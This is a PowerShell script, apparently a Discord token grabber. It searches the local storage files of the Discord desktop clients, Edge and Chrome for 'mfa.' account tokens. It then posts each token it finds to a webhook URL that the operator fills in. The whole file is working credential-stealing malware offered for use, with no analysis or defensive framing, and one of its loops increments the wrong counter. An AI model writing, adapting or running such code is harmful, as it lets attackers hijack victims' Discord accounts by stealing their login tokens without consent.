$path = $env:USERPROFILE
$web = "" #put the webhook here
$canary = Select-String -Path "$path\AppData\Roaming\discordcanary\Local Storage\Leveldb\*.ldb" -Pattern 'mfa.'
$discord = Select-String -Path "$path\AppData\Roaming\discord\Local Storage\Leveldb\*.ldb" -Pattern 'mfa.'
$ptb = Select-String -Path "$path\AppData\Roaming\discordptb\Local Storage\Leveldb\*.ldb" -Pattern 'mfa.'
$edge = Select-String -Path "$path\AppData\Local\Microsoft\Edge\User Data\Default\Local Storage\leveldb\*.ldb" -Pattern 'mfa.'
$chrome = Select-String -Path "$path\AppData\Local\Google\Chrome\User Data\Default\Local Storage\leveldb\*.ldb" -Pattern 'mfa.'

$array = $canary -Split '"'

for (($i = 0); $i -lt $array.count; $i++)
{
    if ($array[$i].Contains('mfa.')){
        $tokencanary = $array[$i]

    }
}

$array1 = $ptb -Split '"'

for (($i = 0); $i -lt $array1.count; $i++)
{
    if ($array1[$i].Contains('mfa.')){
        $tokenptb = $array1[$i]

    }
}

$array2 = $edge -Split '"'

for (($i = 0); $i -lt $array2.count; $i2++)
{
    if ($array2[$i].Contains('mfa.')){
        $tokenedge = $array2[$i]

    }
}

$array3 = $chrome -Split '"'

for (($i = 0); $i -lt $array3.count; $i++)
{
    if ($array3[$i].Contains('mfa.')){
        $tokenchrome = $array3[$i]

    }
}

$array4 = $discord -Split '"'

for (($i = 0); $i -lt $array4.count; $i++)
{
    if ($array4[$i].Contains('mfa.')){
        $tokendiscord = $array4[$i]

    }
}

Invoke-RestMethod -Uri $web -Method POST -Headers @{ "Content-Type" = "application/json" } -Body "{`"content`":`"canary token: $tokencanary`"}"
Invoke-RestMethod -Uri $web -Method POST -Headers @{ "Content-Type" = "application/json" } -Body "{`"content`":`"ptb token: $tokenptb`"}"
Invoke-RestMethod -Uri $web -Method POST -Headers @{ "Content-Type" = "application/json" } -Body "{`"content`":`"edge token: $tokenedge`"}"
Invoke-RestMethod -Uri $web -Method POST -Headers @{ "Content-Type" = "application/json" } -Body "{`"content`":`"chrome token: $tokenchrome`"}"
Invoke-RestMethod -Uri $web -Method POST -Headers @{ "Content-Type" = "application/json" } -Body "{`"content`":`"discord token: $tokendiscord`"}"
